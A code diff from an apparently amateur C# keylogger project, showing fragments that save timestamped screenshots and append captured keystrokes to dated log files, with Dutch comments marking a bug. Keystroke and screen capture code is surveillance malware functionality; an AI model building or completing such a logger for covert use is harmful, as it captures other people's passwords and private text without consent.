@@ -82,9 +82,9 @@ namespace keylogger
                 {
                     g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                 }
-                
+
                 string folderName = @"D:/keylogger/screenshot/";
-                string pathString = System.IO.Path.Combine(folderName, ""+datum.ToShortDateString()+"/");
+                string pathString = System.IO.Path.Combine(folderName, "" + datum.ToShortDateString() + "/");
                 System.IO.Directory.CreateDirectory(pathString);
                 bitmap.Save(pathString + hour + "." + minuten + "." + seconde + ".jpeg", ImageFormat.Jpeg);
 
@@ -98,8 +98,10 @@ namespace keylogger
         static void logkeys()
         {
 
-            
-            string path = (@"D:/keylogger/keylog/"+ datum.ToShortDateString() + ".text");
+            string folderName = "keylog";
+            string pathString = System.IO.Path.Combine(folderName);
+            System.IO.Directory.CreateDirectory(pathString);
+            string path = (@"D:/keylogger/"+pathString+"/"+ datum.ToShortDateString() + ".text");
 
             if (!File.Exists(path))
             {
@@ -110,8 +112,6 @@ namespace keylogger
             KeysConverter converter = new KeysConverter();
             string text = "";
 
-
-            
             while (true)
             {
 
@@ -129,9 +129,8 @@ namespace keylogger
                         using (StreamWriter sw = File.AppendText(path))
                         {
 
-                            // hier is het probleem
-                            List<string> textlist = new List<string>();
-                            textlist[0] = text;
+                            //hier zit het probleem
+
 
                             if (text == "Space")
                             {
